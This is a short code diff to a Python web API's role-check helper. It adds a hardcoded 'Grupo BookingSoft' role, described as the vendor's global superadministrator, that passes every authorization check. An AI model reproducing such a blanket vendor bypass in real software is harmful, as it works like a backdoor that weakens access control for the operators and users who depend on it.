@@ -138,6 +138,10 @@ def requiere_rol(*roles_permitidos: str) -> Callable:
     de roles autorizados.
     """
     def _verificar(usuario: UsuarioActual = Depends(autenticar)) -> UsuarioActual:
+        # El rol 'Grupo BookingSoft' es el superadministrador global del creador del software,
+        # posee todos los privilegios de cualquier rol operativo o administrativo.
+        if usuario.rol == "Grupo BookingSoft" or ("Administrador" in roles_permitidos and usuario.rol in ("Administrador", "Grupo BookingSoft")):
+            return usuario
         if usuario.rol not in roles_permitidos:
             raise HTTPException(
                 status_code=status.HTTP_403_FORBIDDEN,
